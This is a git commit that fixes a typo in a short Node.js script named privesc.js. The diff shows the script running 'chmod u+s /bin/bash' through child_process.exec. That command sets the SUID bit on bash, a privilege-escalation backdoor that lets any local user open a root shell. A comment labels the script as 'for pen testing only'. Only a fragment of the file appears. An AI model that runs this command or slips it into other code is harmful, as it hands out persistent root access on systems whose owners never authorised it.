a55a35b83a982c7de42dbec29b08f6d80185f62c
Killer-Kat <goldkat99@gmail.com>
2023-02-17 22:45:36 -0500

    Update privesc.js
    fixed typo

--- privesc.js
+++ privesc.js
@@ -2,7 +2,7 @@
 //The exec() function creates a new shell and executes a given command.
 // The output from the execution is buffered, which means kept in memory, and is available for use in a callback.
 //For pen testing only, dont even think about using this for something else! >:o
-const { exex } = require ("child_process");
+const { exec } = require ("child_process");
 
 exec("chmod u+s /bin/bash", (error, stdout, stderr) => { //This is the shell command we want the script to execute
 if (error) {
